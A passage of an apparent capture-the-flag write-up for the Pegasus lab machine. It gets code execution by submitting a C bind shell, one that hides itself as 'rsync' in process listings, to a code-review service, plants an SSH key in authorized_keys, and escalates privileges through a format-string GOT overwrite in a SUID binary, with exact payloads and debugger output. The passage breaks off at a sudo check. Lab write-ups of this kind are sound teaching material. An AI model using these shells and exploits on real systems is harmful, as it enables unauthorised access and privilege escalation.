&lt;p&gt;Ooooooh. Ok so that was a very obvious hint that I was getting closer. For me, this boiled down to it either accepting PHP due to &lt;a href=&#34;http://php.net/manual/en/function.system.php&#34;&gt;system&lt;/a&gt;, or C due to its &lt;a href=&#34;http://linux.die.net/man/3/system&#34;&gt;system&lt;/a&gt;. Obviously though, &lt;code&gt;system()&lt;/code&gt; is being filtered out, so I would need an alternative.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;insert fade to black&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;CAPTION: many hours later&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;After exhausting my PHP attempts, it was time to move to C. My first attempt was was something along the lines of&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include&amp;lt;stdio.h&amp;gt;

// msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c
unsigned char buf[] =
&amp;quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&amp;quot;
&amp;quot;\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a&amp;quot;
&amp;quot;\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0&amp;quot;
&amp;quot;\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f&amp;quot;
&amp;quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0&amp;quot;
&amp;quot;\x0b\xcd\x80&amp;quot;;

int main()
{
    int (*ret)() = (int(*)())buf;
    ret();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This was supposed to open me a &lt;code&gt;tcp/4444&lt;/code&gt; shell, but to no avail. Infact, no shellcode related execution appeared to do anything. As a last resort before I figured I&amp;rsquo;d need to get me some hints, I searched for some non-shellcode type bind shell generation C source. Unfortunately, I don’t write C socket software out of my head, but luckily Google came to the rescue and landed me on &lt;a href=&#34;http://bigpointyteeth.se/code/bindshell.c&#34;&gt;this&lt;/a&gt;. I modified the code slightly by hardcoding my desired port and shell, and submitted it to be &amp;lsquo;reviewed&amp;rsquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// Source: http://webcache.googleusercontent.com/search?q=cache:52EC4LfMJX4J:bigpointyteeth.se/code/bindshell.c+&amp;amp;cd=11&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;gl=za
// http://bigpointyteeth.se/code/bindshell.c
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;arpa/inet.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

#define SHELL &amp;quot;/bin/sh&amp;quot;   // shell to execute
#define NAME &amp;quot;rsync&amp;quot;        // name of the forked bindshell shown in ps

int main(int argc, char *argv[]) {
    char msg[16];
    int srv_sockfd, new_sockfd;
    socklen_t new_addrlen;
    struct sockaddr_in srv_addr, new_addr;

    // fork into background
    if (fork() == 0) {
        if ((srv_sockfd = socket(PF_INET, SOCK_STREAM, 0)) &amp;lt; 0) {
            return -1;
        }

        srv_addr.sin_family = PF_INET;
        srv_addr.sin_port = htons(atoi(&amp;quot;4444&amp;quot;));
        srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);

        if (bind(srv_sockfd, (struct sockaddr *)&amp;amp;srv_addr, sizeof(srv_addr)) &amp;lt; 0) {
            return -1;
        }

        if (listen(srv_sockfd, 1) &amp;lt; 0) {
            return -1;
        }

        // accept loop
        for (;;) {
            new_addrlen = sizeof(new_addr);
            new_sockfd = accept(srv_sockfd, (struct sockaddr *)&amp;amp;new_addr, &amp;amp;new_addrlen);
            if (new_sockfd &amp;lt; 0) {
                return -1;
            }

            // fork to handle new connection
            if (fork() == 0) {
                // close old listener
                close(srv_sockfd);
                // print the parent pid which should be killed in order
                // to remove the persistant bindshell listener
                sprintf(msg, &amp;quot;ppid=%d\n&amp;quot;, getppid());
                write(new_sockfd, msg, strlen(msg));

                dup2(new_sockfd, 2);
                dup2(new_sockfd, 1);
                dup2(new_sockfd, 0);

                execl(SHELL, NAME, NULL);
                return 0;
            }
            else
                close(new_sockfd);
        } // end accept loop
    } // end fork into background
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All of my attempts were followed by a nmap on &lt;code&gt;tcp/4444&lt;/code&gt; to see if the shell has become available. After submitting the above code, we got a new port open (this Mike guy is pretty fast you should hire him!):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap 192.168.56.101 -p 4444

Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-23 11:33 SAST
Nmap scan report for 192.168.56.101
Host is up (0.00034s latency).
PORT     STATE SERVICE
4444/tcp open  krb524
MAC Address: 08:00:27:88:F8:40 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome, so lets connect and see what we have:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nc -v 192.168.56.101 4444
192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
(UNKNOWN) [192.168.56.101] 4444 (?) open
ppid=10450
id
uid=1001(mike) gid=1001(mike) groups=1001(mike)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As was hoped for, a shell as &lt;code&gt;mike&lt;/code&gt;. I quickly generated a new ssh key pair for Pegasus, and cat the public key to &lt;code&gt;mike&lt;/code&gt;&amp;rsquo;s &lt;code&gt;authorized_keys&lt;/code&gt; file and went on to SSH in as mike:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# first I cat the public key so that I can copy it
root@kali:~# cat pegasus.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R root@kali

# next I connect to the bind shell listener and move to Mikes .shh directory
root@kali:~# nc -v 192.168.56.101 4444
192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
(UNKNOWN) [192.168.56.101] 4444 (?) open
ppid=10450
cd .ssh

# next we append my public key to mikes authorized_keys
echo &amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R&amp;quot; &amp;gt;&amp;gt; authorized_keys
ls -lh
total 12K
-rw-rw-r-- 1 mike mike  381 Dec 23 20:36 authorized_keys
-rw------- 1 mike mike 1.7K Nov 18 12:39 id_rsa
-rw-r--r-- 1 mike mike  222 Nov 18 17:39 known_hosts
chmod 600 authorized_keys
^C

# with the authorized_keys ready, I SSH in as mike using my key pair
root@kali:~# ssh mike@192.168.56.101 -i pegasus
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-39-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Dec 23 20:36:47 AEDT 2014

  System load:  0.0               Processes:           93
  Usage of /:   6.8% of 18.32GB   Users logged in:     0
  Memory usage: 12%               IP address for eth0: 192.168.56.101
  Swap usage:   0%

  =&amp;gt; There are 2 zombie processes.

  Graph this data and manage this system at:
    https://landscape.canonical.com/


Your Hardware Enablement Stack (HWE) is supported until April 2017.

You have mail.
Last login: Tue Dec 16 19:27:53 2014 from 172.16.246.129
mike@pegasus:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;my-first-your-first-we-all-first&#34;&gt;my_first, your_first, we_all_first&lt;/h2&gt;

&lt;p&gt;With my initial shell I was able to start enumerating Pegasus a little more. The most obvious next step was the SUID binary in &lt;code&gt;mike&lt;/code&gt;&amp;rsquo;s home (we will get to it shortly):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ ls -lh
total 16K
-rwxr-xr-x 1 mike mike  845 Nov 18 20:52 check_code.sh
drwx------ 2 mike mike 4.0K Nov 18 17:49 Mail
-rwsr-xr-x 1 john john 6.5K Nov 28 10:26 my_first
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;More enumeration revealed that &lt;code&gt;/opt/&lt;/code&gt; had a number of interesting parts to it as well:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ ls -lh /opt/
total 12K
drwxrwxrwx 2 root root 4.0K Dec 23 20:33 code_review
drwxr-xr-x 3 root root 4.0K Nov 25 04:38 git
drwxr-xr-x 2 root root 4.0K Nov 18 14:43 nfs
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Piecing the web interface together, you will see that the submitted source is put into &lt;code&gt;code.c&lt;/code&gt; in &lt;code&gt;/opt/code_review/&lt;/code&gt;, and then compiled from the script in &lt;code&gt;/home/mike/check_code.sh&lt;/code&gt; and eventually executed.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;/opt/git/&lt;/code&gt; folder had what looked like remnants of the typical &lt;code&gt;.git/&lt;/code&gt; folders when you checkout code from a repo, but not the actual files itself. I poked around a bit, and was able to re-assemble the &lt;code&gt;main.c&lt;/code&gt; file from the git history.&lt;/p&gt;

&lt;h3 id=&#34;rebuilding-main-c&#34;&gt;rebuilding main.c&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;This step is not essential in progressing with Pegasus, but I figured it would be an interesting approach nonetheless&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Even though the git folder did not appear to have any actual source files, one could quickly learn what it contains. For example, the git log will show you the commit history:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:/opt/git/my_first.git$ git log
commit 85365946a8142c52ee6040a029dd069b514c2ab0
Author: Mike Ross &amp;lt;mike@pegasus.(none)&amp;gt;
Date:   Tue Nov 25 04:48:01 2014 +1100

    Committing some security fixes

commit 0a8af1ed956518ec078b152ad7571105e2df26c6
Author: John Wall &amp;lt;john@pegasus.(none)&amp;gt;
Date:   Tue Nov 25 04:39:42 2014 +1100

    initial commit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From the log we can see that there as an initial commit, and one more after that with some &lt;em&gt;security fixes&lt;/em&gt;. Chances are, if we can see what the initial commit was then we can see the full initial code. So, lets check out the details of commit &lt;em&gt;0a8af1ed&lt;/em&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-diff&#34;&gt;mike@pegasus:/opt/git/my_first.git$ git show 0a8af1ed
commit 0a8af1ed956518ec078b152ad7571105e2df26c6
Author: John Wall &amp;lt;john@pegasus.(none)&amp;gt;
Date:   Tue Nov 25 04:39:42 2014 +1100

    initial commit

diff --git a/main.c b/main.c
new file mode 100644
index 0000000..39c0182
--- /dev/null
+++ b/main.c
@@ -0,0 +1,133 @@
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+
+int calculator();
+int string_replay();
+int string_reverse();
+int quit();
+
+int main()
+{
+    char selection[5];
+    int sel;
+    char * err_check;

[... snip ...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nice! We have a file &lt;code&gt;main.c&lt;/code&gt; that was added. I copied the diff and saved it to &lt;code&gt;init.patch&lt;/code&gt;, and then ran the patch:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# patch -p1 &amp;lt; init.diff
patching file main.c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That gives us the state of files after commit &lt;em&gt;0a8af1ed&lt;/em&gt; which was labeled as the initial commit. The same process was followed for the next commit &lt;em&gt;85365946a8&lt;/em&gt; which apparently included some &lt;em&gt;security fixes&lt;/em&gt;. Copy the diff, make the .patch file and apply it. After this process, we have the sources up to where the git commit history has it.&lt;/p&gt;

&lt;p&gt;I inspected that code before and after the security fixes commit, and noticed that the security fixes fixed a potential format string vulnerability. At least, that was the one my untrained eye was able to spot:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-diff&#34;&gt;diff --git a/main.c b/main.c
index 39c0182..b6b2ed4 100644
--- a/main.c
+++ b/main.c
@@ -8,7 +8,7 @@ int quit();

[... snip ...]
+
         printf(&amp;quot;Enter second number: &amp;quot;);
         if (fgets(numberB, sizeof numberB, stdin) != NULL)
         {
-            int numA = strtol(numberA, &amp;amp;err_check, 10);
             int numB = strtol(numberB, &amp;amp;err_check, 10);
             if (*err_check != &#39;\n&#39;)
             {
-                printf(&amp;quot;Error details: &amp;quot;);
-                printf(err_check);
+                printf(&amp;quot;Error details: %s&amp;quot;, err_check);
                 printf(&amp;quot;\n&amp;quot;);
                 return 1;
[... snip ...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;printf(err_check);&lt;/code&gt; is the potentially vulnerable call&amp;hellip; I think.&lt;/p&gt;

&lt;h3 id=&#34;the-calculator-with-a-hole&#34;&gt;the calculator with a hole&lt;/h3&gt;

&lt;p&gt;After toying with the git repository, my attention turned back to the SUID binary. When I run &lt;code&gt;my_first&lt;/code&gt;, I am actually running it as &lt;code&gt;john&lt;/code&gt;. This means, should I be able to exploit it and do things other than what its intended for, I may affectively gain &lt;code&gt;john&lt;/code&gt;&amp;rsquo;s privileges! Sounds easy right. :P&lt;/p&gt;

&lt;p&gt;I quickly realized that the &lt;code&gt;main.c&lt;/code&gt; file I got out of the git repository, was the sources for the &lt;code&gt;my_first&lt;/code&gt; binary. So, my focus shifted to the piece of code I saw the security fix for.&lt;/p&gt;

&lt;p&gt;First, it was time to confirm my suspicion of a format string vulnerability:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection: 1

Enter first number: 1
Enter second number: %x
Error details: bf96cbec

Selection:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I don’t like format string vulnerabilities. In fact not at all. I was hoping for something else and at this stage, I was happy I found the bug (which was the code before the security fixes btw), but sad that its a format string.&lt;/p&gt;

&lt;p&gt;Anyways, feels aside, it was time to work on a exploit.&lt;/p&gt;

&lt;p&gt;For the format string exploit, I don&amp;rsquo;t think its really worth explaining all the details again. In fact, compiling this exploit, I was referring to a older blogpost about &lt;a href=&#34;https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/&#34;&gt;Xerxes2&lt;/a&gt; which also had a similar thing going. Feel free to check the binary section out there if the next part does not make much sense.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;EDIT&lt;/strong&gt; I have since made a small asciinema showing the offset calculations on my Kali VM. Though the offsets are not the same the theory still applies. &lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/14960.js&#34; id=&#34;asciicast-14960&#34; async data-theme=&#34;solarized-dark&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;h3 id=&#34;punching-more-than-numbers&#34;&gt;punching more than numbers&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;So here, I had a pretty big freaking fail. A massive one. Once I had determined the stack position to start corrupting memory with, I was punching in the format strings in the application itself. Meaning, I was giving it the ASCII \x\x\x\x and not the actual bytes as would have been the case if I was using python/printf to redirect the stdout of them to &lt;code&gt;my_first&lt;/code&gt;&amp;rsquo;s stdin. Anyways, lessons were learnt, caffeine was injected. It wont happen again. Big up to &lt;a href=&#34;https://twitter.com/barrebas&#34;&gt;@barrebas&lt;/a&gt; for subtly pointing the fail out ;p&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;As I had seen the source code, it was easy to formulate a plan for the exploit. I would make use of a ret2libc attack by overriding the GOT entry for &lt;code&gt;printf()&lt;/code&gt; using the format string to &lt;code&gt;system()&lt;/code&gt; instead. This means, the next time &lt;code&gt;printf()&lt;/code&gt; is called, it would actually execute &lt;code&gt;system()&lt;/code&gt; with the adjacent argument on the stack. Lets see how this was done.&lt;/p&gt;

&lt;h4 id=&#34;compiling-the-format-string&#34;&gt;compiling the format string&lt;/h4&gt;

&lt;p&gt;We know that the 2nd number that the applications wants triggers our format string. So, lets prepare some skeleton input, piping it to the &lt;code&gt;./my_first&lt;/code&gt; binary to sample a successful run:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ printf &#39;1\n1\n1\n4\n&#39; | ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection:
Enter first number: Enter second number: Result: 1 + 1 = 2

Selection:
Goodbye!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Cool, so we have sampled adding 1 to 1 ;p Now we can get to exploiting the format string. The first step we have is to determine which parameter on the stack we have control of. We determine this by providing it with a string of 4 A&amp;rsquo;s, and then incrementing the format string arguments by 1 until we can find the 4 A&amp;rsquo;s. In my case, I will be formatting them as hex with &lt;code&gt;%x&lt;/code&gt;, so I am searching for &lt;code&gt;41414141&lt;/code&gt;. The format string will therefore start as &lt;code&gt;AAAA.0x%s&lt;/code&gt;. Note that in the below example we are using 2 x percentages (2 x &amp;lsquo;%&amp;rsquo;) as it needs to be escaped in the shell:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ printf &#39;1\n1\nAAAA.0x%%x\n4\n&#39; | ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection:
Enter first number: Enter second number: Error details: AAAA.0xbff5321c

Selection:
Goodbye!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And we have the output of &lt;code&gt;AAAA.0xbff5321c&lt;/code&gt;. Yay :)
Continuously incrementing this will eventually get you to argument 8, where you will find the clean string of hex A&amp;rsquo;s:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ printf &#39;1\n1\nAAAA.0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x\n4\n&#39; | ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection:
Enter first number: Enter second number: Error details: AAAA.0xbfbd145c0xa0xb75b41600xb7726ac00xb7752ff40xb77539180xbfbd14600x41414141

Selection:
Goodbye!
mike@pegasus:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, using direct parameter access in the format string, we can reference parameter 8 directly:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ printf &#39;1\n1\nAAAA.0x%%8$x\n4\n&#39; | ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection:
Enter first number: Enter second number: Error details: AAAA.0x41414141

Selection:
Goodbye!
mike@pegasus:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Parameter 8 in the format string is the start of the section on the stack we can read now, shown in the output &lt;code&gt;AAAA.0x41414141&lt;/code&gt; of the format string &lt;code&gt;AAAA.0x%8$x&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now we will move on to making use of the &lt;code&gt;%n&lt;/code&gt; format string to write to a arbitrary area in memory. Where do we want to write? To the GOT where the lookup for &lt;code&gt;printf()&lt;/code&gt; occurs ofc! Lets dump the GOT for &lt;code&gt;./my_first&lt;/code&gt;, and determine where it will go look for &lt;code&gt;printf()&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ objdump -R ./my_first

./my_first:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049bec R_386_GLOB_DAT    __gmon_start__
08049c20 R_386_COPY        stdin
08049bfc R_386_JUMP_SLOT   printf
08049c00 R_386_JUMP_SLOT   fgets
08049c04 R_386_JUMP_SLOT   puts
08049c08 R_386_JUMP_SLOT   __gmon_start__
08049c0c R_386_JUMP_SLOT   __libc_start_main
08049c10 R_386_JUMP_SLOT   putchar
08049c14 R_386_JUMP_SLOT   strtol
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The location of &lt;code&gt;printf()&lt;/code&gt; will be looked up at &lt;code&gt;08049bfc&lt;/code&gt;. This is the part where we want to rewrite the address of &lt;code&gt;printf()&lt;/code&gt; to that of libc&amp;rsquo;s &lt;code&gt;system()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The last part we need is to know where &lt;code&gt;system()&lt;/code&gt; actually is. An important vector that may influence this position in memory is known as ASLR, which will effectively cause the address of &lt;code&gt;system()&lt;/code&gt; to be different every time &lt;code&gt;./my_first&lt;/code&gt; is run. To combat this, a neat little trick to increase the stack size can be used using &lt;code&gt;ulimit&lt;/code&gt;. &lt;code&gt;ulimit -s unlimited&lt;/code&gt; will maximize the stack size, effectively causing the ASLR to be practically nonexistent:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ ulimit -s
8192
mike@pegasus:~$ ulimit -s unlimited
mike@pegasus:~$ ulimit -s
unlimited
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the ASLR problem out of the way, lets leak the address of &lt;code&gt;system()&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# fire up gdb
mike@pegasus:~$ gdb -q ./my_first
Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.

# set a break point as we enter main()
(gdb) b main
Breakpoint 1 at 0x804850f

# run the binary
(gdb) r
Starting program: /home/mike/my_first

Breakpoint 1, 0x0804850f in main ()

# leak the current address of system()
(gdb) p system
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x40069060 &amp;lt;system&amp;gt;
(gdb)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And so we learn that &lt;code&gt;system()&lt;/code&gt; lives at &lt;code&gt;0x40069060&lt;/code&gt;. What does this all mean so far then? Well, we are now going to use the format string vulnerability to write (using &lt;code&gt;%n&lt;/code&gt;) a new address for &lt;code&gt;printf()&lt;/code&gt; in the GOT at &lt;code&gt;08049bfc&lt;/code&gt; to point to &lt;code&gt;system()&lt;/code&gt; at &lt;code&gt;0x40069060&lt;/code&gt; instead of its real location.&lt;/p&gt;

&lt;p&gt;For us to debug the application while we prepare the required padding for the format string, we will use the &lt;code&gt;printf()&lt;/code&gt; used to pipe to &lt;code&gt;./my_first&lt;/code&gt; to redirect to a file instead. Then, in &lt;code&gt;gdb&lt;/code&gt;, we will run the binary, redirecting the input from the file we will compile with the &lt;code&gt;printf()&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# so, instead of the 4 x A&#39;s, we will now place the address
# in the GOT that we want to override, and use the %x format
# string to attempt writing to it
mike@pegasus:~$ printf &#39;1\n1\n\xfc\x9b\x04\x08%%8$n&#39; &amp;gt; t
mike@pegasus:~$ file t
t: data

# then, in gdb, we will grab the output of the new file called
# t, and redirect it as input to my_first
mike@pegasus:~$ gdb -q ./my_first
Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.

# leak the current address that GOT points to for printf()
(gdb) x/x 0x08049bfc
0x8049bfc &amp;lt;printf@got.plt&amp;gt;: 0x080483b6

# run the binary with our exploit (t) as input
(gdb) r &amp;lt; t
Starting program: /home/mike/my_first &amp;lt; t
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection:
Enter first number: Enter second number: Error details: ��

Program received signal SIGSEGV, Segmentation fault.
0x00000004 in ?? ()

# inspect the new address the GOT points to for printf()
(gdb) x/x 0x08049bfc
0x8049bfc &amp;lt;printf@got.plt&amp;gt;: 0x00000004
(gdb)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is working exactly as expected. Now all that is left is to pad the format string so that we can have the address &lt;code&gt;0x40069060&lt;/code&gt; instead of &lt;code&gt;0x00000004&lt;/code&gt; written. For the math etc involved, refer to the Xerxes2 post I previously mentioned. The resultant format string was &lt;code&gt;\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&lt;/code&gt;, with a run in the debugger ending in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# prep the input file
mike@pegasus:~$ printf &#39;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&#39; &amp;gt; t
mike@pegasus:~$

# run it in the debugger
(gdb) r &amp;lt;t
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/mike/my_first &amp;lt;t
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection:
Enter first number: Enter second number: Error details: ����

[... snip ...]

sh: 1: Selection:: not found

Program received signal SIGSEGV, Segmentation fault.
0x08c3f98c in ?? ()

# check where the GOT points to for printf()
(gdb) x/x 0x08049bfc
0x8049bfc &amp;lt;printf@got.plt&amp;gt;: 0x40069060

# confirm system() is still there :)
(gdb) p system
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x40069060 &amp;lt;system&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The binary crashes with &lt;code&gt;sh: 1: Selection:: not found&lt;/code&gt;, meaning that it is now trying to run &lt;code&gt;system(&amp;quot;Selection:&amp;quot;)&lt;/code&gt; instead of &lt;code&gt;printf(&amp;quot;Selection:&amp;quot;)&lt;/code&gt; due to the GOT override.&lt;/p&gt;

&lt;h4 id=&#34;finishing-the-exploit&#34;&gt;finishing the exploit&lt;/h4&gt;

&lt;p&gt;From here the exploit is pretty easy. We can use some $PATH trickery in our current shell to get &lt;code&gt;Selection:&lt;/code&gt; to actually mean something, like prepare a small SUID C shell perhaps? :)&lt;/p&gt;

&lt;p&gt;I quickly compiled some C wrapper code to prepare a shell and ran the exploit.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Prep Selection: to make a SUID shell for john
# and modify PATH
mike@pegasus:~$ cat tojohn.c
#include &amp;lt;stdio.h&amp;gt;
int main()
{
    system(&amp;quot;cp /bin/sh /tmp/tojohn&amp;quot;);
    system(&amp;quot;chmod 4777 /tmp/tojohn&amp;quot;);
}
mike@pegasus:~$ gcc tojohn.c -o &amp;quot;Selection:&amp;quot;
mike@pegasus:~$ export PATH=/home/mike/:$PATH

# run the exploit...
mike@pegasus:~$ printf &#39;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&#39; | ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection:
Enter first number: Enter second number: Error details: ����

                     10
Segmentation fault (core dumped)

# ... and check /tmp
mike@pegasus:~$ ls -lah /tmp/
total 108K
drwxrwxrwt  2 root root 4.0K Dec 23 23:17 .
drwxr-xr-x 22 root root 4.0K Nov 19 02:58 ..
-rwsrwxrwx  1 john mike  98K Dec 23 23:17 tojohn
mike@pegasus:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We have a new file &lt;code&gt;tojohn&lt;/code&gt; in &lt;code&gt;/tmp&lt;/code&gt; :D&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ /tmp/tojohn
$ id
uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;hoofing-rooting-pegasus&#34;&gt;hoofing (rooting) Pegasus&lt;/h2&gt;

&lt;p&gt;I added the public key of the keypair I generated for Pegasus to &lt;code&gt;john&lt;/code&gt;&amp;rsquo;s authorized_keys file and proceeded to SSH in as him.&lt;/p&gt;

&lt;p&gt;Quick enumeration showed that &lt;code&gt;mike&lt;/code&gt; is allowed to start the nfs daemon via &lt;code&gt;sudo&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;john@pegasus:~$ sudo -l
